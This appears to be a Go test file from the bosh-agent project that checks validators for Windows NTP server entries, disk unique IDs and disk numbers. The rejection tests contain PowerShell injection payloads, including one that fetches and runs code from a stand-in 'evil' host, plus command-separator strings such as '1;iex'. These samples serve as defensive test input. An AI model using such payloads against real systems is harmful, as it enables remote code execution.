package platform_test

import (
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	. "github.com/cloudfoundry/bosh-agent/v2/platform"
)

var _ = Describe("Windows bootstrap validation", func() {
	Describe("ValidateNtpServerEntry", func() {
		It("accepts IPv4 and IPv6 literals", func() {
			Expect(ValidateNtpServerEntry("10.0.0.1")).To(Succeed())
			Expect(ValidateNtpServerEntry("2001:db8::1")).To(Succeed())
		})

		It("accepts normal hostnames", func() {
			Expect(ValidateNtpServerEntry("0.north-america.pool.ntp.org")).To(Succeed())
			Expect(ValidateNtpServerEntry("ntp.example.com")).To(Succeed())
		})

		It("rejects empty and injection payloads", func() {
			Expect(ValidateNtpServerEntry("")).To(HaveOccurred())
			Expect(ValidateNtpServerEntry(`x"; iex(iwr http://evil/p) #`)).To(HaveOccurred())
			Expect(ValidateNtpServerEntry("bad host")).To(HaveOccurred())
		})

		It("rejects hostnames with empty labels or invalid label characters", func() {
			Expect(ValidateNtpServerEntry("a..b")).To(HaveOccurred())
			Expect(ValidateNtpServerEntry("a-.b.example.com")).To(HaveOccurred())
		})

		It("rejects a label longer than 63 characters", func() {
			longLabel := strings.Repeat("a", 64)
			Expect(ValidateNtpServerEntry(longLabel + ".example.com")).To(HaveOccurred())
		})

		It("rejects hostnames with leading or trailing dots", func() {
			Expect(ValidateNtpServerEntry(".foo.example.com")).To(HaveOccurred())
			Expect(ValidateNtpServerEntry("foo.example.com.")).To(HaveOccurred())
		})

		It("documents behavior for bracketed IPv6 literals (not accepted as IP; hostname validation fails)", func() {
			Expect(ValidateNtpServerEntry("[::1]")).To(HaveOccurred())
		})
	})

	Describe("ValidateWindowsDiskUniqueID", func() {
		It("accepts hex of reasonable length", func() {
			Expect(ValidateWindowsDiskUniqueID("f0015401d")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("c00101d0d00d")).To(Succeed())
		})

		It("accepts boundary lengths, mixed case, and non-hex identifier punctuation", func() {
			Expect(ValidateWindowsDiskUniqueID("a")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("short")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("1234567")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("12345678")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID(strings.Repeat("f", 128))).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("AbCdEf01")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("naa.5000abcd")).To(Succeed())
			Expect(ValidateWindowsDiskUniqueID("scsi-3:0:0:1")).To(Succeed())
		})

		It("rejects disallowed characters", func() {
			Expect(ValidateWindowsDiskUniqueID("0;iex")).To(HaveOccurred())
			Expect(ValidateWindowsDiskUniqueID("bad'quote01")).To(HaveOccurred())
			Expect(ValidateWindowsDiskUniqueID("has space01")).To(HaveOccurred())
		})

		It("rejects empty and too long strings", func() {
			Expect(ValidateWindowsDiskUniqueID("")).To(HaveOccurred())
			Expect(ValidateWindowsDiskUniqueID(strings.Repeat("0", 1025))).To(HaveOccurred())
		})
	})

	Describe("ValidateWindowsDiskNumberString", func() {
		It("accepts non-negative integers", func() {
			s, err := ValidateWindowsDiskNumberString("42")
			Expect(err).NotTo(HaveOccurred())
			Expect(s).To(Equal("42"))
		})

		It("canonicalizes whitespace and leading zeros", func() {
			s, err := ValidateWindowsDiskNumberString("  7  ")
			Expect(err).NotTo(HaveOccurred())
			Expect(s).To(Equal("7"))

			s, err = ValidateWindowsDiskNumberString("007")
			Expect(err).NotTo(HaveOccurred())
			Expect(s).To(Equal("7"))
		})

		It("rejects malicious strings", func() {
			_, err := ValidateWindowsDiskNumberString(`1;iex`)
			Expect(err).To(HaveOccurred())
		})

		It("rejects negative and empty strings", func() {
			_, err := ValidateWindowsDiskNumberString("-1")
			Expect(err).To(HaveOccurred())
			_, err = ValidateWindowsDiskNumberString("")
			Expect(err).To(HaveOccurred())
		})
	})
})
